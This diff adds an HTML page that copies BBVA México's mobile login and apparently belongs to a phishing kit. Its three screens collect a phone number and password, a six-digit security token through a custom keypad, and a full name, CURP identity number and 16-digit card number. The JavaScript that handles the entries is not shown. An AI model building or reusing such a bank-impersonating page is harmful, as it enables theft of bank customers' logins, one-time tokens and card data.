@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
+  <meta name="theme-color" content="#004481" />
+  <meta name="referrer" content="no-referrer" />
+  <title>BBVA México</title>
+  <link rel="stylesheet" href="./css/main.css" />
+</head>
+<body>
+  <div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+  <div class="container page is-active" id="loginPage" data-page="login">
+    <header class="nav-bar" aria-hidden="true"></header>
+    <div class="page-content">
+      <div class="app-logo">
+        <img src="./assets/bbva.svg" width="120" height="36" alt="BBVA" />
+      </div>
+      <div class="greeting">
+        <p>Hola</p>
+        <p>Ingresa a tu cuenta BBVA</p>
+      </div>
+      <div class="field-block">
+        <div class="input-wrapper" id="emailWrapper">
+          <input type="tel" id="emailInput" placeholder="Celular (10 dígitos)" maxlength="10" inputmode="numeric" autocomplete="off" />
+        </div>
+        <p class="error-msg" id="emailError"></p>
+      </div>
+      <div class="field-block">
+        <div class="input-wrapper" id="dynamicPasswordWrapper">
+          <svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+            <rect x="3" y="11" width="18" height="11" rx="2" />
+            <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+          </svg>
+          <input type="password" id="dynamicPasswordInput" placeholder="Contraseña (6 caracteres, letras y números)" maxlength="6" autocomplete="off" />
+        </div>
+        <p class="error-msg" id="dynamicPasswordError"></p>
+      </div>
+      <button type="button" class="btn" id="registerBtn">
+        <span class="btn-text">Entrar</span>
+        <span class="spinner" aria-hidden="true"></span>
+      </button>
+      <div class="help-link">
+        <button type="button" class="link-btn" id="forgotLink">¿Olvidaste tu contraseña?</button>
+        <span class="help-sep" aria-hidden="true">|</span>
+        <button type="button" class="link-btn" id="signupLink">Regístrate</button>
+      </div>
+    </div>
+    <div class="footer-line" aria-hidden="true"></div>
+  </div>
+
+  <div class="container page" id="paymentPage" data-page="payment">
+    <header class="nav-bar">
+      <button type="button" class="nav-btn" id="backFromPaymentBtn" aria-label="Volver">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+          <path d="M15 18l-6-6 6-6" />
+        </svg>
+      </button>
+    </header>
+    <div class="page-content">
+      <p class="page-title is-center" id="paymentTitle">
+        <span id="paymentTitlePrefix">Ingresa tu Token para </span>
+        <span id="paymentPhonePrefix"></span><span id="paymentPhoneNumber"></span>
+      </p>
+      <p class="page-subtitle is-center">para verificar tu identidad</p>
+      <div class="six-digit" id="paymentDigitDisplay">
+        <div class="digit-box"></div>
+        <div class="digit-box"></div>
+        <div class="digit-box"></div>
+        <div class="digit-box"></div>
+        <div class="digit-box"></div>
+        <div class="digit-box"></div>
+        <input type="tel" id="hiddenPaymentInput" class="hidden-input" readonly maxlength="6" inputmode="numeric" autocomplete="off" tabindex="-1" aria-hidden="true" />
+      </div>
+      <p class="error-msg is-center" id="paymentError"></p>
+      <div class="payment-forgot">
+        <button type="button" class="link-btn">¿Olvidaste tu Token?</button>
+      </div>
+      <button type="button" class="btn" id="paymentLoginBtn" disabled>
+        <span class="btn-text">Verificar</span>
+        <span class="spinner" aria-hidden="true"></span>
+      </button>
+    </div>
+    <div class="keyboard" id="numberKeyboard" aria-label="Teclado numérico">
+      <div class="keyboard-row">
+        <button type="button" class="key" data-num="1">1</button>
+        <button type="button" class="key" data-num="2">2</button>
+        <button type="button" class="key" data-num="3">3</button>
+      </div>
+      <div class="keyboard-row">
+        <button type="button" class="key" data-num="4">4</button>
+        <button type="button" class="key" data-num="5">5</button>
+        <button type="button" class="key" data-num="6">6</button>
+      </div>
+      <div class="keyboard-row">
+        <button type="button" class="key" data-num="7">7</button>
+        <button type="button" class="key" data-num="8">8</button>
+        <button type="button" class="key" data-num="9">9</button>
+      </div>
+      <div class="keyboard-row">
+        <button type="button" class="key key-fn" id="keyClear">Borrar</button>
+        <button type="button" class="key" data-num="0">0</button>
+        <button type="button" class="key key-fn key-del" id="keyDelete" aria-label="Borrar dígito">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="22" height="22" aria-hidden="true">
+            <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z" />
+            <line x1="18" y1="9" x2="12" y2="15" />
+            <line x1="12" y1="9" x2="18" y2="15" />
+          </svg>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <div class="container page" id="forgotPasswordPage" data-page="forgot">
+    <header class="nav-bar">
+      <button type="button" class="nav-btn" id="backFromForgotBtn" aria-label="Volver">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+          <path d="M15 18l-6-6 6-6" />
+        </svg>
+      </button>
+    </header>
+    <div class="page-content">
+      <p class="page-title">Restablecer contraseña</p>
+      <p class="page-subtitle">Verifica tu identidad</p>
+      <div class="field-block">
+        <div class="input-wrapper" id="forgotEmailWrapper">
+          <svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+            <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
+            <polyline points="22,6 12,13 2,6" />
+          </svg>
+          <input type="tel" id="forgotEmailInput" placeholder="Celular (10 dígitos)" maxlength="10" inputmode="numeric" autocomplete="off" />
+        </div>
+        <p class="error-msg" id="forgotEmailError"></p>
+      </div>
+      <div class="field-block">
+        <div class="input-wrapper" id="nameWrapper">
+          <svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
+            <circle cx="12" cy="7" r="4" />
+          </svg>
+          <input type="text" id="nameInput" placeholder="Nombre completo (como en la cuenta)" maxlength="50" autocomplete="name" />
+        </div>
+        <p class="error-msg" id="nameError"></p>
+      </div>
+      <div class="field-block">
+        <div class="input-wrapper" id="curpWrapper">
+          <svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+            <rect x="2" y="5" width="20" height="14" rx="2" />
+            <line x1="2" y1="10" x2="22" y2="10" />
+          </svg>
+          <input type="text" id="curpInput" placeholder="CURP (18 caracteres)" maxlength="18" autocomplete="off" />
+        </div>
+        <p class="error-msg" id="curpError"></p>
+      </div>
+      <div class="field-block field-block-lg">
+        <div class="input-wrapper" id="bankCardWrapper">
+          <svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+            <rect x="2" y="5" width="20" height="14" rx="2" />
+            <line x1="2" y1="10" x2="22" y2="10" />
+          </svg>
+          <input type="text" id="bankCardInput" placeholder="Tarjeta (16 dígitos)" maxlength="16" inputmode="numeric" autocomplete="off" />
+        </div>
+        <p class="error-msg" id="bankCardError"></p>
+      </div>
+      <button type="button" class="btn" id="verifyIdentityBtn">
+        <span class="btn-text">Continuar</span>
+        <span class="spinner" aria-hidden="true"></span>
+      </button>
+      <div class="help-link">
+        <button type="button" class="link-btn" id="helpLink">Ayuda</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="./js/main.js"></script>
+</body>
+</html>
